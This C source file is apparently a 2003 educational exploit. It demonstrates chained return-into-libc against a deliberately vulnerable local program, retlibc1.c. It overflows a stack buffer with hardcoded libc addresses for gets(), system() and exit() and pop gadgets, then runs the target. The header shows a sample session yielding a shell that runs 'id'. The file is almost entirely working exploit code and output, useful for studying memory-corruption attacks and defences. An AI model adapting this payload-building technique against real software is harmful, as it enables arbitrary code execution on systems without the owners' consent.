/*
 * $Id: retlibc1-ex7.c,v 1.1.1.1 2004/05/29 14:15:05 raptor Exp $
 *
 * retlibc1-ex7.c - retlibc1.c exploit (return-into-libc)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This exploit shows the chained return-into-libc technique, changing the
 * execution flow of an abo1.c-like vulnerable program. In this example we
 * chain together gets(), system(), and exit(): upon successful exploitation
 * gets() is called to read the argument for system(); then, after system()
 * execution, the program does a clean exit().
 *
 * Many thanks to Olivier Gay <olivier.gay@epfl.ch> for his nice doc.
 *
 * Misc useful information:
 * o	$ objdump -d /lib/libc.so.6 | grep -B 1 ret | grep pop
 * o	$ gdb /lib/libc.so.6 -q
 * 	(gdb) disass 0xd2ba4
 * o	$ gcc retlibc1.c -o retlibc1 -g
 * 	$ gdb retlibc1 -q
 * 	(gdb) b main
 * 	(gdb) r
 * 	(gdb) p &buf
 * o	See also http://www.0xdeadbeef.info/code/libc-search.c
 *
 * $ ./retlibc1-ex7 
 * Using gets() address: 0x4007c380
 * Using system() address: 0x4005f590
 * Using exit() address: 0x40045dc0
 * id
 * uid=3008(raptor) gid=1000(redazione) groups=1000(redazione)
 * $
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF	293			// (65 * 4) + (4 * 8) + 1
#define	VULN	"./retlibc1"		// the vulnerable program

#define LIBBASE	0x4001a000		// base address of libc mapping
#define	GETS	(LIBBASE + 0x00062380)	// gets() address in libc
#define SYSTEM	(LIBBASE + 0x00045590)	// system() address in libc
#define EXIT	(LIBBASE + 0x0002bdc0)	// exit() address in libc

#define	POP1	(LIBBASE + 0xd2ba4)	// pop 1 argument from the stack
#define	POP2	(LIBBASE + 0xd2ba3)	// pop 2 arguments from the stack
#define	POP3	(LIBBASE + 0xd2ba2)	// pop 3 arguments from the stack
#define	POP4	(LIBBASE + 0xd2ba1)	// pop 4 arguments from the stack
#define	STACK	0xbffffbbc		// vuln buf address on the stack

int main()
{
	char buf[BUF];
	int *p = (int *)buf;

	fprintf(stderr, "Using gets() address: %p\n", GETS);
	fprintf(stderr, "Using system() address: %p\n", SYSTEM);
	fprintf(stderr, "Using exit() address: %p\n", EXIT);

	/* fill the first part of the buffer */
	memset(buf, 'A', BUF);
	p += 65;

	/* prepare the stack */
	*p++ = GETS;	/* gets() address in libc */
	*p++ = POP1;	/* pop 1 argument */
	*p++ = STACK;	/* gets() argument */
	*p++ = SYSTEM;	/* system() address in libc */
	*p++ = POP1;	/* pop 1 argument */
	*p++ = STACK;	/* system() argument */
	*p++ = EXIT;	/* exit() address in libc */
	*p++ = STACK;	/* dummy address */
	*p = 0x0;

	/* run the vulnerable program */
	execl(VULN, VULN + 2, buf, NULL);
	perror("execl");
}
